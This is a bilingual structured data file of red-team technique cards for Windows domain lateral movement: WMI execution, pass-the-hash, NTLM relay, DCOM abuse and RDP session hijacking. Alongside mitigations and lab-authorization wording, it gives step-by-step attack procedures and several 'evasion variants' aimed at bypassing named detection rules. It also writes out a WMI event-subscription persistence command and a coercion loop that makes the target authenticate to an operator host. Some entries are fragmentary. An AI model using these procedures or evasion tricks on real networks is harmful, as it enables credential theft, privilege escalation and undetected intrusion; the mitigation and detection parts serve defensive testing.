prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: WMI 远程管理授权验证覆盖 DCOM/WMI 远程执行场景：针对持有凭据或哈希的测试主体，验证能否经 135 端口调用 Win32_Process 在目标创建进程。验证维度涵盖 wmic 单命令、wmiexec 交互 shell、哈希传递与 PowerShell 原生调用四种路径。
overview.en: WMI Remote-Management Authorization Validation covers DCOM/WMI remote execution: for a test principal holding credentials or a hash, verify whether Win32_Process can be invoked over port 135 to create a process on the target. Verification dimensions cover single-command wmic, an interactive wmiexec shell, pass-the-hash, and native PowerShell invocation.

vulnerability.zh: 根因是 WMI/DCOM 默认允许管理员组主体远程调用 Win32_Process.Create；口令弱化或哈希泄露后，攻击者无需向目标落盘任何工具即可拉起进程，行为混入正常 WMI 活动，检测依赖 4688 进程与 5857 WMI 活动事件关联。
vulnerability.en: The root cause is that WMI/DCOM by default lets administrators invoke Win32_Process.Create remotely; with weak passwords or leaked hashes, an attacker launches processes without dropping any tool on the target, and the activity blends into normal WMI traffic, making detection dependent on correlating 4688 process events with 5857 WMI activity.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 wmic 远程创建 cmd /c whoami 进程，返回目标主机名输出且目标侧出现 4688/5857 事件即确认成功；第 2 步进入 wmiexec 交互 shell 验证持续控制能力；第 3 步改用 -hashes 以 NTLM 哈希完成认证再取 shell；第 4 步用 Invoke-WmiMethod 复现，ReturnValue 0 且目标出现新进程即确认。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 remotely creates a cmd /c whoami process with wmic — returned hostname output plus 4688/5857 events on the target confirms success; step 2 enters an interactive wmiexec shell to verify sustained control; step 3 switches to -hashes to authenticate with the NTLM hash and obtain a shell; step 4 replays with Invoke-WmiMethod — ReturnValue 0 plus a new process on the target confirms. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 将 WMI/DCOM 远程访问限制到管理网段与跳板机，收紧 WMI 命名空间与 DCOM 激活权限，禁用不需要的远程 WMI 功能；监控 Win32_Process.Create 调用与 5857/4688 事件。修复后用第 1、4 步样例回归，远程进程创建应返回拒绝错误。
mitigation.en: Restrict WMI/DCOM remote access to the management segment and jump hosts, tighten WMI namespace and DCOM launch permissions, and disable unnecessary remote WMI features; monitor Win32_Process.Create calls and 5857/4688 events. After the fix, regress with the step 1 and step 4 samples: remote process creation must return an access-denied error.

description.zh: 用 wmic /node:目标 process call create 启动回连命令；目标进程列表出现新进程即 WMI 远程执行可用且无文件落地。
description.en: Use wmic /node:target process call create to start a callback command; the new process appearing on the target shows WMI remote execution works without file drops.

title.en: Open an interactive channel with wmiexec

description.zh: 运行 wmiexec.py 以口令登录目标；返回管理员级半交互 shell 即建立稳定横向通道，可连续执行命令。
description.en: Run wmiexec.py with credentials; an admin-level semi-interactive shell establishes a stable lateral channel for continuous commands.

description.zh: 以 -hashes 方式重跑 wmiexec；同样拿到 shell 即 NTLM 哈希在 WMI 通道有效，可横向到仅握有哈希的主机。
description.en: Re-run wmiexec with -hashes; the same shell proves the NTLM hash works over WMI, extending reach to hash-only hosts.

title.en: Fan out with native PowerShell WMI

description.zh: 用 Invoke-WmiMethod 调 Win32_Process.Create 在域内批量下发命令；各目标返回 ProcessId 即完成无第三方二进制的批量横向。
description.en: Use Invoke-WmiMethod with Win32_Process.Create to fan commands across the domain; ProcessId returns from each target complete tool-free batch execution.

analysis.zh: WMI 远程管理授权验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: WMI Remote-Management Authorization Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对实验主机 WMI/DCOM 可达性、命名空间 ACL 与事件日志，不调用 Win32_Process.Create。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 绕过 wmic.exe 弃用遥测与进程链检测（wmic.exe→子进程特征）：用 PowerShell CIM 直连 WMI 服务。成功判据：进程创建成功且父进程非 wmic.exe。
description.en: Evades deprecated wmic.exe telemetry and process-chain detection (wmic.exe→child signature) by using PowerShell CIM to reach the WMI service directly. Success: process creation succeeds with a non-wmic parent.

title.zh: 事件订阅持久化规避变体

wafBypass.command: $filter=Set-CimInstance -Namespace root\subscription -ClassName __EventFilter -Arguments @{Name='SysHealth';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $consumer=Set-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Arguments @{Name='SysHealth';CommandLineTemplate='cmd /c whoami > C:\Windows\Temp\w.log'}; Set-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}

description.zh: 绕过一次性 wmiexec 会话的 4648/进程创建告警：改用事件订阅延迟触发，无即时进程链关联。成功判据：60 秒内 w.log 生成且无即时父进程关联。
description.en: Evades one-shot wmiexec session alerts (4648/process creation) by switching to an event subscription that fires later with no immediate parent correlation. Success: w.log appears within 60s without an immediate parent chain.

title.zh: 共享输出回读规避变体

description.zh: 绕过 WMI 输出通道监控：结果重定向共享，规避 stdout 编码回传特征。成功判据：w.txt 含执行身份。
description.en: Evades WMI output-channel monitoring by redirecting results to a share instead of the encoded stdout return path. Success: w.txt contains the execution identity.

name.zh: NTLM Hash 登录防护验证

description.zh: NTLM Hash 登录防护验证保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: NTLM Hash Logon Protection Validation preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 NTLM Hash 登录防护验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for NTLM Hash Logon Protection Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: NTLM Hash 登录防护验证覆盖哈希传递场景：针对已获取 NTLM 哈希但无明文口令的测试主体，验证能否以哈希直接完成认证并访问目标。验证维度涵盖 psexec 远程执行、crackmapexec 批量验证、sekurlsa::pth 进程注入与 PowerShell SMB 客户端四种利用面。
overview.en: NTLM Hash Logon Protection Validation covers pass-the-hash: for a test principal holding an NTLM hash without the plaintext password, verify whether the hash alone authenticates and grants access. Verification dimensions cover psexec remote execution, crackmapexec batch validation, sekurlsa::pth process injection, and a PowerShell SMB client.

vulnerability.zh: 根因是 NTLM 协议把哈希本身当作认证凭据，响应由 NTLM 哈希直接参与计算，任何拿到哈希的主体无需破解即可完成认证；未启用 SMB 签名与账号隔离时，本地管理员哈希跨机复用进一步放大横向移动前景。
vulnerability.en: The root cause is that the NTLM protocol treats the hash itself as the credential — the challenge response is computed directly from the NTLM hash — so anyone holding it authenticates without cracking; without SMB signing and account isolation, cross-machine reuse of local-admin hashes further amplifies lateral movement prospects.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 psexec.py -hashes 直接开 shell，目标出现 4624 NewCredentials 登录即确认成功；第 2 步用 crackmapexec smb 验证哈希有效性，返回 Pwn3d! 即确认具备本地管理员权限；第 3 步用 sekurlsa::pth 启动携带注入凭据的新进程访问域资源；第 4 步用 Invoke-SMBClient 以哈希列出目标共享内容。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 opens a shell directly with psexec.py -hashes — a 4624 NewCredentials logon on the target confirms success; step 2 validates the hash with crackmapexec smb — Pwn3d! output confirms local administrator rights; step 3 uses sekurlsa::pth to launch a new process carrying the injected credential and reach domain resources; step 4 lists target shares with Invoke-SMBClient using the hash. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 启用 SMB 签名与 EPA，实施本地管理员隔离策略（禁止本地管理员跨机复用、LAPS 随机化），对敏感账号禁用 NTLM 并审计 4624 NewCredentials 类型登录。修复后用第 1、2 步样例回归，哈希认证应被目标直接拒绝。
mitigation.en: Enable SMB signing and EPA, enforce local-admin isolation (no cross-machine reuse, LAPS randomization), disable NTLM for sensitive accounts, and audit 4624 NewCredentials logons. After the fix, regress with the step 1 and step 2 samples: hash authentication must be rejected by the target.

title.zh: 哈希批量喷洒圈定范围
title.en: Spray hashes to map reachable hosts

description.zh: 用 crackmapexec smb 携带 NTLM 哈希批量喷洒网段；标注 Pwn3D! 的主机清单即哈希可横行的目标范围。
description.en: Spray the segment with crackmapexec smb using the NTLM hash; hosts flagged Pwn3D! define where the hash grants access.

title.zh: 哈希直连拿下首个立足点
title.en: Claim the first foothold with the hash

description.zh: 对命中主机用 psexec.py -hashes 登录；返回 SYSTEM shell 即拿到域内首个受控节点，后续以此为跳板。
description.en: Log into a hit host with psexec.py -hashes; a SYSTEM shell is the first controlled node and the pivot for what follows.

title.zh: 注入哈希伪造登录会话
title.en: Forge a logon session with the hash

description.zh: 本机运行 mimikatz sekurlsa::pth 弹出新凭据进程；在该会话内直接访问目标资源即以哈希完成身份伪装。
description.en: Run mimikatz sekurlsa::pth locally to spawn a credentialed process; accessing targets from that session impersonates the identity with just the hash.

title.en: Access restricted shares with the hash

description.zh: 用 Invoke-SMBClient 以哈希连接目标并列出目录；成功读写文件即确认哈希对 SMB 资源完整有效，可拖取敏感文档。
description.en: Connect with Invoke-SMBClient using the hash and list shares; successful read/write confirms the hash fully works against SMB and sensitive files can be pulled.

analysis.zh: NTLM Hash 登录防护验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: NTLM Hash Logon Protection Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 使用合成认证日志与专用账号核对 NTLM 限制、管理员隔离和远程 UAC，不注入或使用真实哈希。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 绕过 impacket psexec.py 的 Python 流量指纹与二进制落盘：纯 PowerShell 内存态 SMB 客户端枚举。成功判据：返回共享列表且无新进程落盘。
description.en: Evades impacket psexec.py Python traffic fingerprints and binary drops by enumerating via a pure PowerShell in-memory SMB client. Success: share list returns with no new binaries landed.

description.zh: 绕过执行类告警（服务创建/进程启动）：先用哈希仅做共享枚举验证可用性，不触发载荷执行。成功判据：返回 [+] 认证成功与共享清单。
description.en: Evades execution alerts (service creation/process start) by validating the hash via share enumeration only, with no payload execution. Success: returns [+] access granted plus the share list.

description.zh: 绕过 NTLM 中继检测与 NTLM 事件告警：先把哈希换成 Kerberos TGT 再访问，流量呈现为标准 Kerberos。成功判据：dir 列出共享且网络流量为 Kerberos。
description.en: Evades NTLM relay detection and NTLM event alerts by exchanging the hash for a Kerberos TGT first so traffic looks like standard Kerberos. Success: dir lists the share with Kerberos traffic only.

name.zh: NTLM Relay 协议边界验证

description.zh: NTLM Relay 协议边界验证保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: NTLM Relay Protocol-Boundary Validation preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 NTLM Relay 协议边界验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for NTLM Relay Protocol-Boundary Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: NTLM Relay 协议边界验证覆盖认证中继场景：针对 SMB/LDAP 未强制签名或 EPA 的内网环境，验证能否把截获的 NTLM 认证转发到第三台主机完成越权操作。验证维度涵盖 Responder 捕获、SMB 中继、LDAP 中继提权与 IPv6 DNS 劫持组合四种路径。
overview.en: NTLM Relay Protocol-Boundary Validation covers authentication relaying: in intranets where SMB/LDAP do not enforce signing or EPA, verify whether captured NTLM authentication can be forwarded to a third host for unauthorized operations. Verification dimensions cover Responder capture, SMB relay, LDAP relay privilege escalation, and an IPv6 DNS hijack combination.

vulnerability.zh: 根因是 NTLM 认证不绑定目标服务，签名与通道绑定未强制时，攻击者可把受害者发出的认证原样转发给第三台主机并以其身份执行操作；中继到 LDAP 还能借 ACL 修改或 ADCS 注册直接提升为域级权限。
vulnerability.en: The root cause is that NTLM authentication is not bound to the target service; without enforced signing and channel binding, an attacker forwards the victim's authentication verbatim to a third host and acts as that identity; relaying into LDAP can even escalate to domain-level rights via ACL modification or ADCS enrollment.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在隔离网段运行 Responder 监听，控制台打印捕获的 NTLMv2 Hash 即确认认证可截获；第 2 步用 ntlmrelayx 中继到 SMB 目标，打印 RELAY 成功并列出目标可写共享；第 3 步中继到 LDAP 并 --escalate-user，目标账号获得提升且 DC 记录 4662 目录变更；第 4 步组合 mitm6 应答 IPv6 DNS，把 LDAP 写入送达域控。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 runs Responder on an isolated segment — printed NTLMv2 hashes confirm interception; step 2 relays to an SMB target with ntlmrelayx — RELAY success lines plus writable-share enumeration; step 3 relays into LDAP with --escalate-user — the account is escalated and the DC logs 4662 directory changes; step 4 pairs mitm6 answering IPv6 DNS to push the LDAP write through to the DC. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 全域强制 SMB 签名、LDAP 签名与通道绑定（EPA），禁用 NTLM 或限制到已防护通道，禁用不必要的 IPv6 并对 DNS 记录变更告警；监控 4662 目录变更与异常认证链。修复后用第 2、3 步样例回归，中继应被目标以签名/通道绑定错误拒绝。
mitigation.en: Enforce SMB signing, LDAP signing, and channel binding (EPA) domain-wide; disable NTLM or confine it to protected channels, disable unnecessary IPv6 with alerts on DNS record changes, and monitor 4662 directory changes and abnormal auth chains. After the fix, regress with the step 2 and step 3 samples: relays must be rejected with signing/channel-binding errors.

description.zh: 启动 Responder 监听 eth0 并开启 WPAD 等欺骗；控制台持续输出挑战响应即认证流量已被劫持捕获。
description.en: Start Responder on eth0 with WPAD poisoning; challenge-response lines streaming on the console mean authentication traffic is being captured.

title.zh: 中继认证到 SMB 目标

description.zh: 运行 ntlmrelayx.py -tf targets.txt -smb2support；目标回吐 SAM 哈希转储即认证中继成功，全程无需破解口令。
description.en: Run ntlmrelayx.py -tf targets.txt -smb2support; SAM hashes dumped from targets confirm the relay worked without cracking anything.

title.zh: 中继到 LDAP 提升域权限
title.en: Escalate in the domain via LDAP relay

description.zh: 把中继目标切到 ldap://DC 并加 --escalate-user；回显用户被加入高权限组或获得敏感 ACL 即完成域内提权。
description.en: Point the relay at ldap://DC with --escalate-user; the user landing in a privileged group or gaining a sensitive ACL completes domain escalation.

title.zh: IPv6 接管无人值守中继

description.zh: 用 mitm6 接管 DHCPv6 再中继到 LDAP；捕获机器账号认证并控制计算机对象即覆盖无 WPAD 的网段。
description.en: Take over DHCPv6 with mitm6 and relay into LDAP; machine-account captures with computer-object control extend reach to segments without WPAD.

analysis.zh: NTLM Relay 协议边界验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: NTLM Relay Protocol-Boundary Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对 SMB/LDAP 签名、EPA、通道绑定与实验抓包，不监听生产网段或中继认证。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: SOCKS 长驻低噪规避变体

description.zh: 绕过一次性转储触发的集中告警：中继凭证入 SOCKS 池供后续按需使用，减少批量 SAM 转储特征。成功判据：SOCKS 列表出现可用凭证且无即时转储行为。
description.en: Evades central alerting on one-shot dumps by parking relayed creds in a SOCKS pool for on-demand reuse, removing bulk SAM-dump signatures. Success: SOCKS list shows usable creds with no immediate dump.

title.zh: HTTP 目标多元规避变体

description.zh: 绕过 SMB 中继专用检测（针对 445 转储特征）：改经 HTTP 端口中继到多目标，流量形态为 Web。成功判据：多目标认证成功记录。
description.en: Evades SMB-relay-specific detection (445 dump signatures) by relaying over HTTP to multiple targets so traffic looks like web. Success: successful auth records for multiple targets.

title.zh: 强制认证源轮换规避变体

wafBypass.command: for m in petitpotam printerbug dfscoerce; do python3 ${m}.py -d {LAB_DOMAIN} -u {LAB_USER} -p {LAB_PASSWORD} {LAB_OPERATOR_HOST} {LAB_HOST}; done

description.zh: 绕过针对单一强制工具（如仅监控 PetitPotam CLSID）的检测：轮换 printerbug/dfscoerce 触发认证。成功判据：任一工具使目标回连操作机。
description.en: Evades detection pinned to a single coercion primitive (e.g. PetitPotam CLSID only) by rotating printerbug/dfscoerce to trigger auth. Success: any tool makes the target call back to the operator host.

name.zh: DCOM 远程激活授权验证

description.zh: DCOM 远程激活授权验证保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: DCOM Remote-Activation Authorization Validation preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 DCOM 远程激活授权验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for DCOM Remote-Activation Authorization Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: DCOM 远程激活授权验证覆盖 COM 远程激活场景：针对持有目标主机本地管理员凭据的测试主体，验证能否经 135 端口远程实例化危险 COM 对象并执行命令。验证维度涵盖 MMC20.Application、ShellBrowserWindow CLSID 与 Excel DCOM 三种常用对象。
overview.en: DCOM Remote-Activation Authorization Validation covers COM remote activation: for a test principal holding the target's local administrator credentials, verify whether dangerous COM objects can be instantiated remotely over port 135 to execute commands. Verification dimensions cover MMC20.Application, the ShellBrowserWindow CLSID, and Excel DCOM.

vulnerability.zh: 根因是 DCOM 激活权限默认允许管理员组远程实例化 COM 服务器，而 MMC20、ShellBrowserWindow 等对象暴露 ExecuteShellCommand/ShellExecute 类方法；凭据复用使攻击者不创建服务或计划任务即可获得命令执行，痕迹仅剩 DCOM 激活进程链。
vulnerability.en: The root cause is that DCOM launch permissions by default let administrators instantiate COM servers remotely, and objects such as MMC20 and ShellBrowserWindow expose ExecuteShellCommand/ShellExecute-style methods; credential reuse grants command execution without creating services or scheduled tasks, leaving only the DCOM activation process chain as a trace.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 GetTypeFromProgID 远程实例化 MMC20.Application 并调用 ExecuteShellCommand 执行 whoami，目标出现 DCOM 激活来源的进程即确认成功；第 2 步用 ShellBrowserWindow CLSID 调用 ShellExecute 复现执行；第 3 步用 Excel DCOM 触发 DDEInitiate 验证 DDE 链路，calc 或 cmd 进程出现即确认。三条路径均无需文件落盘；LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 instantiates MMC20.Application remotely via GetTypeFromProgID and invokes ExecuteShellCommand to run whoami — a process with a DCOM-activation origin on the target confirms success; step 2 replays execution through the ShellBrowserWindow CLSID via ShellExecute; step 3 triggers DDEInitiate through Excel DCOM — a calc or cmd process confirms the DDE path. All three leave no files on disk; replace LAB_* placeholders via the global variables menu.

mitigation.zh: 收紧 DCOM 激活与访问权限到管理网段专用账号，禁用不需要的 COM 服务器远程激活，主机防火墙限制 135 端口；监控父进程为 DCOM 服务的 4688 进程创建事件。修复后用第 1 步样例回归，远程激活应返回 E_ACCESSDENIED。
mitigation.en: Tighten DCOM launch and access permissions to dedicated accounts from the management segment, disable remote activation of unneeded COM servers, and restrict port 135 with host firewalls; monitor 4688 process creations whose parent is a DCOM service. After the fix, regress with the step 1 sample: remote activation must return E_ACCESSDENIED.

title.zh: 激活 MMC20 执行远程命令

description.zh: 远程实例化 MMC20.Application 后调 ExecuteShellCommand 执行 cmd /c whoami；目标出现命令回显或新进程即 DCOM 横向成功。
description.en: Instantiate MMC20.Application remotely and call ExecuteShellCommand with cmd /c whoami; output or a new process on the target confirms DCOM lateral movement.

title.zh: 更换对象规避检测规则

description.zh: 以 CLSID C08AFD90 激活 ShellBrowserWindow 并调 ShellExecute 执行命令；命令照常执行即绕过紧盯 MMC20 的检测规则。
description.en: Activate ShellBrowserWindow via CLSID C08AFD90 and call ShellExecute; commands still executing means MMC20-focused detection rules are dodged.

title.zh: Excel DDE 触发命令执行

description.zh: 远程激活 Excel.Application 后调 DDEInitiate 执行 cmd /c calc.exe；目标出现计算器进程即 Office 组件可作横向载体执行任意命令。
description.en: Activate Excel.Application remotely and DDEInitiate cmd /c calc.exe; calc appearing on the target shows Office components carry arbitrary commands laterally.

analysis.zh: DCOM 远程激活授权验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: DCOM Remote-Activation Authorization Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只读取实验主机 DCOM 激活权限、CLSID 注册和日志，不调用 ShellExecute 或远程 COM 方法。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 绕过对 MMC20.Application ProgID 的高频检测规则：换 ShellWindows CLSID 激活路径，行为等价。成功判据：d.txt 生成于目标。
description.en: Evades high-frequency detection on the MMC20.Application ProgID by switching to the equivalent ShellWindows CLSID activation. Success: d.txt appears on the target.

description.zh: 绕过对 ProgID 字符串的静态特征匹配：运行期拼接 ProgID 再解析。成功判据：实例创建成功且静态扫描无完整 ProgID 字符串。
description.en: Evades static ProgID string matching by assembling the ProgID at runtime before resolution. Success: instance creation succeeds with no complete ProgID string for static scans.

title.zh: Excel DDE 输出转存规避变体

description.zh: 绕过 Excel 进程的命令行参数审计：DDE 公式执行并将输出转存共享，进程参数无敏感内容。成功判据：x.txt 含 whoami 输出。
description.en: Evades Excel process command-line auditing by executing via a DDE formula with output redirected to a share, keeping process args clean. Success: x.txt contains the whoami output.

name.zh: RDP 会话隔离与接管防护审计
name.en: RDP Session Isolation and Takeover Protection Audit

description.zh: RDP 会话隔离与接管防护审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: RDP Session Isolation and Takeover Protection Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 RDP 会话隔离与接管防护审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for RDP Session Isolation and Takeover Protection Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: RDP 会话隔离与接管防护审计覆盖会话接管场景：针对已在目标主机获得 SYSTEM 或管理员上下文的测试主体，验证能否在无需目标口令的情况下接管其他用户的交互会话。验证维度涵盖会话枚举、tscon 重定向接管与 Mimikatz ts::remote 三条路径。
overview.en: RDP Session Isolation and Takeover Protection Audit covers session takeover: for a test principal already holding SYSTEM or administrator context on the target, verify whether other users' interactive sessions can be hijacked without their passwords. Verification dimensions cover session enumeration, tscon redirection takeover, and Mimikatz ts::remote.

vulnerability.zh: 根因是 tscon 以 SYSTEM 服务权限执行会话重定向，管理员或 SYSTEM 主体无需目标会话口令即可把他人会话接到自己桌面；未启用断开即锁定与凭据保护时，处于断开状态的特权会话成为直接接管目标。
vulnerability.en: The root cause is that tscon performs session redirection with SYSTEM service privileges, so an administrator or SYSTEM principal can attach another user's session to their own desktop without its password; when disconnect-lock and credential guard are absent, disconnected privileged sessions become direct takeover targets.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 query user 枚举会话，记录目标用户名、会话 ID 与状态（Active/Disconnect）；第 2 步用 tscon SESSION_ID /dest:console 把目标会话重定向到本机 console，获得其桌面且系统日志记录会话重连即确认成功；第 3 步用 Mimikatz ts::sessions 定位会话后以 ts::remote 复现接管。SESSION_ID 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 enumerates sessions with query user, recording the target username, session ID, and state (Active/Disconnect); step 2 redirects the target session to the local console with tscon SESSION_ID /dest:console — gaining its desktop plus a session-reconnect entry in the system log confirms success; step 3 locates sessions with Mimikatz ts::sessions and replays takeover via ts::remote. Replace the SESSION_ID placeholder via the global variables menu.

mitigation.zh: 对特权账号启用断开即锁屏与屏幕保护锁定策略，收紧会话所有权接管相关权限，部署 RDP 空闲超时；监控 4778/4779 会话重连与 tscon 命令行调用。修复后用第 2 步样例回归，低权限主体接管他人会话应被拒绝并留痕。
mitigation.en: Enable disconnect-lock and screensaver lock policies for privileged accounts, tighten session-ownership takeover rights, and deploy RDP idle timeouts; monitor 4778/4779 session reconnects and tscon command-line invocations. After the fix, regress with the step 2 sample: takeover by a lower-privileged principal must be denied and logged.

description.zh: 在已控主机以 SYSTEM 运行 query user；列出断开或活动状态的高权限会话与 SESSION_ID 即锁定接管对象。
description.en: Run query user as SYSTEM on a controlled host; privileged sessions listed with their SESSION_IDs are the hijack targets.

title.zh: 接管会话免密进入桌面
title.en: Hijack a session without its password

description.zh: 用 tscon SESSION_ID /dest:console 把他人会话切到本地控制台；无需该用户口令即进入其桌面，直接可见已登录应用与文档。
